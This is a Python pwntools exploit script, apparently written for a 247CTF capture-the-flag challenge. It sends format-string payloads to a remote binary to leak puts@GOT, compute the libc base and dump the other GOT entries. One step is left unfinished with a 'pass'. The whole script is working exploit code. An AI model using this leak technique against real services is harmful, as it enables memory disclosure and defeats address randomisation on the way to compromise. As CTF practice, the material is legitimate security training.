#!/usr/bin/env python3
"""
Identify all GOT entries by leaking their resolved libc addresses
and computing offsets from libc base.
"""
from pwn import *
import time

context.log_level = 'info'

HOST = 'dfbf809476196221.247ctf.com'
PORT = 50145
PUTS_OFFSET = 0x67b60
PUTS_GOT = 0x804a010

r = remote(HOST, PORT, timeout=15)
time.sleep(0.5)
try:
    r.recvuntil(b"again?\n", timeout=4)
except:
    r.recv(4096, timeout=1)

def sync():
    try:
        return r.recvuntil(b"again?\n", timeout=3)
    except:
        data = b''
        while True:
            try:
                chunk = r.recv(4096, timeout=0.5)
                if chunk: data += chunk
                else: break
            except: break
        return data

# Step 1: Leak libc via puts@GOT
log.info("Leaking libc via puts@GOT...")
r.sendline(p32(PUTS_GOT) + b'XXXX%11$s')
resp = sync()
idx = resp.find(b'XXXX')
puts_addr = u32(resp[idx+4:idx+8])
libc = puts_addr - PUTS_OFFSET
log.info(f"puts@libc = {hex(puts_addr)}")
log.info(f"libc base = {hex(libc)}")

# Step 2: Leak each GOT entry
got_entries = {}
for addr in range(0x804a00c, 0x804a024, 4):
    r.sendline(p32(addr) + b'G%11$s')
    resp = sync()
    idx = resp.find(b'G')
    if idx >= 0:
        raw = resp[idx+1:]
        end = raw.find(b'!')
        if end >= 0:
            raw = raw[:end]
        if len(raw) >= 4:
            val = u32(raw[:4])
            offset = val - libc
            got_entries[addr] = (val, offset)

            # Identify known functions
            if 0x08048000 <= val <= 0x08049000:
                tag = "UNRESOLVED (PLT stub)"
            elif offset == PUTS_OFFSET:
                tag = "puts"
            else:
                tag = f"libc+{hex(offset)}"

            log.info(f"  GOT {hex(addr)}: {hex(val)} ({tag})")
        elif len(raw) > 0:
            log.info(f"  GOT {hex(addr)}: short read ({len(raw)} bytes): {raw.hex()}")
        else:
            log.info(f"  GOT {hex(addr)}: empty (contains null bytes early)")

# Step 3: Also try reading 4 bytes as raw hex
log.info("\nRe-reading as raw dwords...")
for addr in range(0x804a00c, 0x804a024, 4):
    # Read 4 bytes at addr using format string
    payload = b'DWORD' + p32(addr) + b'%12$s'
    r.sendline(payload)
    resp = sync()
    idx = resp.find(b'DWORD')
    if idx >= 0:
        raw = resp[idx+5:]
        # The 4-byte address is before the %s result
        # Actually, let me use a different approach
        pass

# Step 4: Identify gets specifically
# gets in glibc is typically at offset around 0x64d40 or similar
# Let me check common offsets
log.info("\nCommon glibc function offsets for this libc version:")
log.info(f"  puts   = {hex(PUTS_OFFSET)}")

# Try to identify by offset ranges
for addr, (val, offset) in got_entries.items():
    if 0x08048000 <= val <= 0x08049000:
        continue  # Skip unresolved
    if offset == PUTS_OFFSET:
        continue  # Already identified

    # Check if it could be gets (usually near puts in libc)
    # Check if it could be __printf_chk (usually in a different section)
    log.info(f"\n  GOT {hex(addr)}: offset {hex(offset)}")
    log.info(f"    Distance from puts: {hex(offset - PUTS_OFFSET)}")

    # Try to read the function name from the dynamic symbol table
    # or just note the offset for manual lookup

r.close()
